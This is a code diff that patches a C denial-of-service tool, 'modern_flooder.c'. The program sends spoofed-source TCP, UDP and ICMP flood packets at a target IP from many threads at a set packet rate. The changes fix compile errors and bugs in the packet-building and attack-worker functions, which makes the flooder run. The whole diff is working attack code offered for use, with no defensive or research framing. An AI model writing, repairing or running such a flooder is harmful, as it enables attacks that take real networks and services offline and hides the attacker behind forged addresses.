@@ -2,6 +2,7 @@
 // Compile: gcc -O3 -pthread -o flooder modern_flooder.c
 // Usage: ./flooder -t TARGET_IP -p PORT -d DURATION -c THREADS -r PPS -m MODE
 
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -71,7 +72,7 @@ unsigned short in_cksum(unsigned short *ptr, int nbytes) {
     return (unsigned short)(~sum);
 }
 
-// Pseudo header for TCP/UDP checksum
+// Pseudo header for TCP checksum
 struct pseudo_tcp {
     unsigned int saddr;
     unsigned int daddr;
@@ -109,8 +110,7 @@ void build_tcp_packet(unsigned char *buffer, unsigned int src_ip, unsigned int d
     tcp->ack_seq = htonl(ack_seq);
     tcp->doff = 5;  // 5*4=20 bytes header
     tcp->res1 = 0;
-    tcp->cwr = 0;
-    tcp->ece = 0;
+    tcp->res2 = 0;
     tcp->urg = 0;
     tcp->ack = (flags & 0x10) ? 1 : 0;
     tcp->psh = (flags & 0x08) ? 1 : 0;
@@ -233,16 +233,17 @@ void *attack_worker(void *arg) {
     clock_gettime(CLOCK_MONOTONIC, &next_time);
 
     unsigned char packet[MAX_PACKET_SIZE];
-    int payload_len = (attack_mode == 1 || attack_mode == 2) ? 1400 : 0; // UDP/ICMP use large payload
+    int payload_len;
     if (attack_mode == 1) payload_len = 1400;   // UDP
-    if (attack_mode == 2) payload_len = 1400;   // ICMP
-    if (attack_mode == 0) payload_len = 0;      // SYN
+    else if (attack_mode == 2) payload_len = 1400; // ICMP
+    else payload_len = 0;                      // TCP modes
 
     while (running) {
         unsigned int src_ip = random_ip(&rng_state);
         unsigned short src_port = xorshift32(&rng_state) % 65535 + 1;
         unsigned int seq = xorshift32(&rng_state);
         unsigned int ack_seq = xorshift32(&rng_state);
+        int packet_len = 0;
 
         int flags;
         switch (attack_mode) {
@@ -258,17 +259,17 @@ void *attack_worker(void *arg) {
             // TCP flood
             build_tcp_packet(packet, src_ip, dest.sin_addr.s_addr, src_port, target_port,
                              seq, ack_seq, flags, payload_len);
-            int packet_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len;
+            packet_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len;
             sendto(sock, packet, packet_len, 0, (struct sockaddr *)&dest, sizeof(dest));
         } else if (attack_mode == 1) {
             // UDP flood
             build_udp_packet(packet, src_ip, dest.sin_addr.s_addr, src_port, target_port, payload_len);
-            int packet_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len;
+            packet_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len;
             sendto(sock, packet, packet_len, 0, (struct sockaddr *)&dest, sizeof(dest));
         } else if (attack_mode == 2) {
             // ICMP flood
             build_icmp_packet(packet, src_ip, dest.sin_addr.s_addr, payload_len);
-            int packet_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + payload_len;
+            packet_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + payload_len;
             sendto(sock, packet, packet_len, 0, (struct sockaddr *)&dest, sizeof(dest));
         }
 
@@ -295,7 +296,6 @@ void *attack_worker(void *arg) {
 
 // Statistics reporter thread
 void *stats_reporter(void *arg) {
-    unsigned long long last_packets = 0;
     time_t start = time(NULL);
     while (running) {
         sleep(STATS_INTERVAL_SEC);
@@ -338,6 +338,7 @@ int main(int argc, char **argv) {
     thread_count = 4;
     target_pps = 10000;   // per thread
     attack_mode = 0;
+    memset(target_ip, 0, sizeof(target_ip));
 
     int opt;
     while ((opt = getopt(argc, argv, "t:p:d:c:r:m:")) != -1) {
